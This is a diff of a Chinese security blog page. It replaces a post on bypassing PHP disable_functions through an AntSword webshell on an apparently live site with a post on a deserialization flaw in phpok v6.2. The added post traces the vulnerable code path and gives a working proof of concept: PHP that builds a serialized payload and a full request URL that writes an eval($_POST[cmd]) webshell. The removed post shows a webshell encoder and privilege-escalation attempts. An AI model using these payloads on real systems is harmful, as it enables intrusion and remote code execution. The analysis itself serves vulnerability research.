@@ -20,31 +20,31 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="接着上回没有bypass disable_function 账户交易系统 | Y0ng的博客 (yongsheng.site) 这回发现上回那个站点开启了php-fpm，然后bypass">
+  <meta name="description" content="漏洞描述phpok v6.2存在前台反序列化漏洞，可写入webshell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="蚁剑 PHP-FPM bypass disable_function">
-<meta property="og:url" content="http://example.com/2021/11/09/%E8%9A%81%E5%89%91PHP-FPM%20bypass%20disable_function/index.html">
+<meta property="og:title" content="phpok v6.2">
+<meta property="og:url" content="http://example.com/2022/08/23/phpok/index.html">
 <meta property="og:site_name" content="Y0ng的博客">
-<meta property="og:description" content="接着上回没有bypass disable_function 账户交易系统 | Y0ng的博客 (yongsheng.site) 这回发现上回那个站点开启了php-fpm，然后bypass">
+<meta property="og:description" content="漏洞描述phpok v6.2存在前台反序列化漏洞，可写入webshell">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/f0c992f3f9bb49f2a57763917dccfbdc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/9c5e1c7adbbc4a19b2b841edf7adc8a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/1ab02175d5894b088652384b451399d6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/08b30ba3a7f44d269fd22ca9f18d3133.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a9bb600df599475b9e87173e933523e5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/4212b725f4784b77adbb866b5cebbcc0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/42ebb4a7c1b7433d8e9901dc5aecd1b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b1be2ba14c4b4ae3a55a8b0c0ffd52df.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c01fae061d114576afa28bebd6c31d4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/cf96f903480647e0b06554079b3b24d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/7588686fdd2e4e4ca0ab4b1c6b3fdf9d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="article:published_time" content="2021-11-09T15:10:26.779Z">
-<meta property="article:modified_time" content="2021-11-09T15:10:20.276Z">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192310421.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192435631.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192513656.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192758472.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193211462.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193416311.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193544127.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193749126.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193945436.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823194026493.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823200533226.png">
+<meta property="article:published_time" content="2022-08-23T12:17:17.205Z">
+<meta property="article:modified_time" content="2022-08-23T12:17:08.013Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/f0c992f3f9bb49f2a57763917dccfbdc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta name="twitter:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192310421.png">
 
-<link rel="canonical" href="http://example.com/2021/11/09/%E8%9A%81%E5%89%91PHP-FPM%20bypass%20disable_function/">
+<link rel="canonical" href="http://example.com/2022/08/23/phpok/">
 
 
 <script id="page-configurations">
@@ -57,7 +57,7 @@
   };
 </script>
 
-  <title>蚁剑 PHP-FPM bypass disable_function | Y0ng的博客</title>
+  <title>phpok v6.2 | Y0ng的博客</title>
   
 
 
@@ -200,7 +200,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/09/%E8%9A%81%E5%89%91PHP-FPM%20bypass%20disable_function/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/23/phpok/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/cys.jpg">
@@ -213,7 +213,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          蚁剑 PHP-FPM bypass disable_function
+          phpok v6.2
         </h1>
 
         <div class="post-meta">
@@ -224,7 +224,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-11-09 23:10:26 / 修改时间：23:10:20" itemprop="dateCreated datePublished" datetime="2021-11-09T23:10:26+08:00">2021-11-09</time>
+              <time title="创建时间：2022-08-23 20:17:17 / 修改时间：20:17:08" itemprop="dateCreated datePublished" datetime="2022-08-23T20:17:17+08:00">2022-08-23</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -254,43 +254,39 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>接着上回没有bypass disable_function</p>
-<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2021/08/23/%E8%B4%A6%E6%88%B7%E4%BA%A4%E6%98%93%E7%B3%BB%E7%BB%9F/">账户交易系统 | Y0ng的博客 (yongsheng.site)</a></p>
-<p>这回发现上回那个站点开启了php-fpm，然后bypass</p>
-<p><img src="https://img-blog.csdnimg.cn/f0c992f3f9bb49f2a57763917dccfbdc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+        <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>phpok v6.2存在前台反序列化漏洞，可写入webshell</p>
 <a id="more"></a>
-<p>先写shell</p>
-<p>验证：</p>
-<p><img src="https://img-blog.csdnimg.cn/9c5e1c7adbbc4a19b2b841edf7adc8a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>蚁剑创建编码器：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line"></span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line"></span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>连接：</p>
-<p><img src="https://img-blog.csdnimg.cn/1ab02175d5894b088652384b451399d6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>无法执行系统命令<br>利用蚁剑的插件</p>
-<p><img src="https://img-blog.csdnimg.cn/08b30ba3a7f44d269fd22ca9f18d3133.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>这里fgi的地址需要找到</p>
-<p>发现在/tmp目录下</p>
-<p><img src="https://img-blog.csdnimg.cn/a9bb600df599475b9e87173e933523e5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>直接利用，利用成功后会在shell目录下生成一个<code>.antproxy.php</code></p>
-<p><img src="https://img-blog.csdnimg.cn/4212b725f4784b77adbb866b5cebbcc0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>具体的原理：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.xlab.app/p/a63cefbc/?highlight=%E8%9A%81%E5%89%91">蚁剑 disable_functions 研究 | 明天的乌云 </a></p>
-<p>蚁剑是有一个php-fpm绕过disable的插件</p>
-<p>蚁剑的bypass插件他这里的话是通过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;sh -c php -n -S 127.0.0.1:60049 -t &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
-<p>起了一个 <code>新的PHP Server</code>，-n就是不使用php.ini，从而实现了bypass disable_functions，然后在插件的源码可以看到，从133行起的exploit()函数里面，有一个生成扩展，上传扩展，然后最主要的部分是从197行开始构造请求包攻击使用php-fpm加载扩展，关键代码如下。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">197 var payload &#x3D; &#96;$&#123;FastCgiClient()&#125;;</span><br><span class="line">198     $content&#x3D;&quot;&quot;;</span><br><span class="line">199     $client &#x3D; new Client(&#39;$&#123;fpm_host&#125;&#39;,$&#123;fpm_port&#125;);</span><br><span class="line">        ...</span><br><span class="line">211     &#39;PHP_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br><span class="line">212     &#39;PHP_ADMIN_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>这套cms的两个参数：c = 控制器   f = 函数</p>
+<p>framework\api\call_control.php#index</p>
+<p>data参数为json格式，解析之后不允许存在type_id</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192310421.png" alt="image-20220823192310421"></p>
+<p>往下进入framework\phpok_tpl_helper.php#phpok函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192435631.png" alt="image-20220823192435631"></p>
+<p>调用framework\phpok_call.php#phpok函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192513656.png" alt="image-20220823192513656"></p>
+<p>通过 parse_str 这里产生漏洞，控制了type_id参数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192758472.png" alt="image-20220823192758472"></p>
+<p>接着根据$id即 m_picplayer 去获取一套模板数组$call_rs，再通过array_merge合并，导致type_id的值可控</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193211462.png" alt="image-20220823193211462"></p>
+<p>修改为 format_ext_all</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193416311.png" alt="image-20220823193416311"></p>
+<p>根据type_id的值加上下划线，构造出的函数名必须在这33个之中，这里还能挖掘其他32个函数的利用</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193544127.png" alt="image-20220823193544127"></p>
+<p>然后调用该函数就是存在反序列化的函数，跟着构造就完事了</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193749126.png" alt="image-20220823193749126"></p>
+<h1 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h1><p>pop chain有手就行，全局搜索 __destruct() 发现 framework\engine\cache.php#__destruct() 存在save，而且两个参数都可控</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193945436.png" alt="image-20220823193945436"></p>
+<p>文件名，文件内容都可控，就是加了一个exit，php://filter加编码器直接过</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823194026493.png" alt="image-20220823194026493"></p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$folder</span> = <span class="string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=D:/phpstudy_pro/WWW/docker/smity2/html/&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$key_id</span> = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$key_list</span> = <span class="string">&#x27;aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW2NtZF0pOz8+&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exp</span> = urlencode(urlencode(serialize(<span class="keyword">new</span> cache())));</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$exp</span>); </span><br></pre></td></tr></table></figure>
 
-<p>那么总结下来的整个攻击流程就是：<code>首先生成扩展，攻击php-fpm执行扩展，然后就会在目标机器本地开启一个新的web服务器，通过antproxy.php转发到无disable的php server上，此时就成功达成了bypass disable_function</code></p>
-<p>Shell创建副本，然后将新的shell名字改为<code>.antproxy.php</code></p>
-<p><img src="https://img-blog.csdnimg.cn/42ebb4a7c1b7433d8e9901dc5aecd1b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>进入终端 , 准备上线提权</p>
-<p><img src="https://img-blog.csdnimg.cn/b1be2ba14c4b4ae3a55a8b0c0ffd52df.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>发现disable没有mail函数等，尝试利用上传.so镜像进行bypass<br>上传两大件</p>
-<p><img src="https://img-blog.csdnimg.cn/c01fae061d114576afa28bebd6c31d4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>访问：</p>
-<p><img src="https://img-blog.csdnimg.cn/cf96f903480647e0b06554079b3b24d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
-<p>好吧，没看到putenv也被ban了 无法利用</p>
-<p><img src="https://img-blog.csdnimg.cn/7588686fdd2e4e4ca0ab4b1c6b3fdf9d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;api.php?c&#x3D;call&amp;f&#x3D;index&amp;data&#x3D;&#123;&quot;m_picplayer&quot;: &quot;0%26type_id%3Dformat_ext_all%26x%5Bform_type%5D%3Durl%26x%5Bcontent%5D%3DO%253A5%253A%2522cache%2522%253A3%253A%257Bs%253A6%253A%2522folder%2522%253Bs%253A107%253A%2522php%253A%252F%252Ffilter%252Fwrite%253Dstring.strip_tags%257Cconvert.base64-decode%252Fresource%253DD%253A%252Fphpstudy_pro%252FWWW%252Fdocker%252Fsmity2%252Fhtml%252F%2522%253Bs%253A6%253A%2522key_id%2522%253Bs%253A5%253A%2522shell%2522%253Bs%253A8%253A%2522key_list%2522%253Bs%253A41%253A%2522aaaaaIDw%252FcGhwIGV2YWwoJF9QT1NUW2NtZF0pOz8%252B%2522%253B%257D&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823200533226.png" alt="image-20220823200533226"></p>
 
     </div>
 
@@ -306,13 +302,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/11/05/%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E7%90%86%E8%A7%A3/" rel="prev" title="简单栈溢出理解">
-      <i class="fa fa-chevron-left"></i> 简单栈溢出理解
+    <a href="/2022/08/05/websocket/" rel="prev" title="websocket内存马">
+      <i class="fa fa-chevron-left"></i> websocket内存马
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/11/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20pwn/" rel="next" title="攻防世界 pwn 新手">
-      攻防世界 pwn 新手 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -371,6 +364,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POP"><span class="nav-number">3.</span> <span class="nav-text">POP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-number">4.</span> <span class="nav-text">POC</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
